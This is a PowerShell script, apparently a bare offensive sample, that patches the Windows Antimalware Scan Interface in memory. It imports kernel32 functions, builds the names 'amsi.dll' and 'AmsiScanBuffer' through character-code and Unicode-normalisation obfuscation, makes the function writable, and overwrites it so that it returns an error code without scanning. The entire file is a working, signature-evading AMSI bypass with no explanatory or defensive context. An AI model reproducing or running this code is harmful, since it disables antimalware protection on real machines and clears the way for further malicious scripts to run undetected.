$CPzxQjPcTULnhYT38c6 = @"
using System;
using System.Runtime.InteropServices;
public class CPzxQjPcTULnhYT38c6 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr YXz, string Y0i_eAtkw__KW);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr S7Gnr6SJr, UIntPtr ZmouyUEE3c82hkeGiQIl, uint LgxvNXr29_z, out uint qNZaR);
}
"@

Add-Type $CPzxQjPcTULnhYT38c6

$dYEwQdZPrRTJ8y = [CPzxQjPcTULnhYT38c6]::LoadLibrary("$([chAr](97)+[cHar](109+93-93)+[cHAr]([BYtE]0x73)+[CHaR](105)+[CHAr](46)+[cHAr]([BYtE]0x64)+[Char](108+31-31)+[cHaR]([BYtE]0x6c))")
$yiTwxYXuKqyOUi0E_x__ = [CPzxQjPcTULnhYT38c6]::GetProcAddress($dYEwQdZPrRTJ8y, "$(('ÄmsíScán'+'Bûffêr').norMAlIZe([cHAR]([bYtE]0x46)+[char]([bytE]0x6f)+[CHaR](114*71/71)+[Char]([byTe]0x6d)+[CHAr](68*41/41)) -replace [chAR](92)+[ChaR]([bYTE]0x70)+[cHar](123*7/7)+[cHar]([bYTE]0x4d)+[cHar]([BYte]0x6e)+[chAR]([BYte]0x7d))")
$p = 0
[CPzxQjPcTULnhYT38c6]::VirtualProtect($yiTwxYXuKqyOUi0E_x__, [uint32]5, 0x40, [ref]$p)
$kpCIQEydYHhtMqtUy7 = "0xB8"
$MD5NmJdWYX8yhXG4tS98 = "0x57"
$Fb6yQ5XCkFKntAH1ckvI = "0x00"
$Lfd = "0x07"
$X7d = "0x80"
$CUjGX = "0xC3"
$IZxJsW = [Byte[]] ($kpCIQEydYHhtMqtUy7,$MD5NmJdWYX8yhXG4tS98,$Fb6yQ5XCkFKntAH1ckvI,$Lfd,+$X7d,+$CUjGX)
[System.Runtime.InteropServices.Marshal]::Copy($IZxJsW, 0, $yiTwxYXuKqyOUi0E_x__, 6)